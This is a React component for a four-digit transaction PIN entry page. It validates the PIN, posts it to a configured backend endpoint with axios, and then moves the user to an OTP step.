import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const PinPage = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      document.getElementById(`pin-${index - 1}`).focus();
    }
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Main Content Container */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Card Container */}
        <div className="w-full max-w-sm">
          {/* Lock Icon */}
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center">
              <svg
                className="w-8 h-8 text-purple-700"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                />
              </svg>
            </div>
          </div>

          {/* Title */}
          <h1 className="text-2xl font-bold text-gray-900 text-center mb-3">
            Enter Your PIN
          </h1>

          {/* Subtitle */}
          <p className="text-gray-600 text-center mb-8 text-sm leading-relaxed">
            For your security, please enter your 4-digit transaction PIN to
            verify your identity and proceed
          </p>

          {/* Form */}
          <form onSubmit={handleSubmit(submitForm)}>
            {/* Hidden registered input for react-hook-form */}
            <input type="hidden" {...register("pin")} />

            {/* PIN Input Boxes */}
            <div className="flex justify-center gap-6 mb-6">
              {pin.map((data, index) => (
                <input
                  key={index}
                  id={`pin-${index}`}
                  type="password"
                  name={`pin-${index}`}
                  maxLength="1"
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                  onFocus={(e) => e.target.select()}
                  className="w-12 h-12 text-center text-xl font-semibold border-b-4 border-purple-700 bg-transparent focus:outline-none transition-all"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                />
              ))}
            </div>

            <div className="mb-6 min-h-[20px]">
              <FormErrMsg errors={errors} inputName="pin" />
            </div>

            {/* Forgot PIN */}
            <div className="text-center mb-8">
              <a
                href="/forgot-pin"
                className="text-amber-500 text-sm font-medium hover:text-amber-600"
              >
                Forgot your PIN?
              </a>
            </div>

            {/* Buttons */}
            <div className="space-y-4">
              {/* Confirm Button */}
              <button
                type="submit"
                disabled={loading || pin.some((digit) => digit === "")}
                className="w-full bg-purple-700 hover:bg-purple-800 text-white py-3.5 rounded-lg font-semibold text-base transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? "Verifying..." : "Confirm"}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PinPage;
